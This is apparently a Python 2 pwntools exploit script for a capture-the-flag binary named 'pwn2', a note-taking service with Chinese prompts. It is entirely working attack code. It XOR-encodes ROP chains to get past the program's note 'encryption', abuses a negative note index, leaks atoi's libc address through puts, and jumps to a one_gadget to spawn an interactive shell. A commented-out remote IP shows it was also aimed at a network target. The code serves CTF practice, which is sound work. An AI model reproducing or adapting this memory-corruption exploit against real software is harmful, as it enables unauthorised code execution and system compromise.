# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'

libc = ELF("./libc")
file_elf  = ELF("./pwn2")
#p = remote("124.16.75.162", 40008)
p=process("./pwn2")
def add(title,content):

    p.recvuntil("退出\n")
    p.sendline("1")
    p.recvuntil("输入笔记标题：\n")
    p.sendline(title)
    p.recvuntil("输入笔记内容：\n")
    p.sendline(content)

def crypt(idx,number,key):

    p.recvuntil("退出\n")
    p.sendline("2")
    p.recvuntil("输入笔记id:\n")
    p.sendline(idx)
    p.recvuntil("中强与加密\n")
    p.sendline(number)
    p.recvuntil("加密密钥：\n")
    p.sendline(key)

def temp(content):

    p.recvuntil("退出\n")
    p.sendline("1")
    p.recvuntil("输入笔记标题：\n")
    p.sendline(content)

rop = ""
pop_rdi = 0x400a02
atoi_got = 0x602050
puts_plt = 0x400620
pop_rsi_r15 = 0x400a00
read_plt = 0x400650
bss = 0x602090
pop_rsp = 0x400c03
pop_r14_r15 = 0x4009ff
one_gadget = 0x4526a
retn = 0x400609

rop += p64(pop_rdi) + p64(atoi_got) + p64(puts_plt) + p64(pop_rsi_r15)
rop += p64(20) + p64(0x0) + p64(pop_r14_r15)
rop2 = ""
rop2 += p64(pop_rdi) + p64(bss+0x50) + p64(0x400990) + p64(pop_rsp) + p64(bss+0x50) + p64(retn)


rop = "".join(chr(ord(x)^0xff) for x in rop)
rop2 = "".join(chr(ord(x)^0xff) for x in rop2)

add("a"*10, "a"*38 + rop) #0
add("a"*10, "a"*10 + rop2) #1
add("a"*10, "a"*100) #2
add("a"*10, "a"*100) #3
add("a"*10, "a"*100) #4
raw_input()
crypt("4","-9","255")
crypt("2","0","255")
crypt("0","0","255")
crypt("1","0","255")
p.recvuntil("退出\n")
p.sendline("4")
p.recvuntil("使用结束\n")
data = p.recv(6)
temp = data.ljust(8,"\x00")
libc = u64(temp) - libc.symbols['atoi'] 
print "libc : " + hex(libc)
one = one_gadget + libc
p.sendline(p64(one) + "a"*11)
p.interactive()
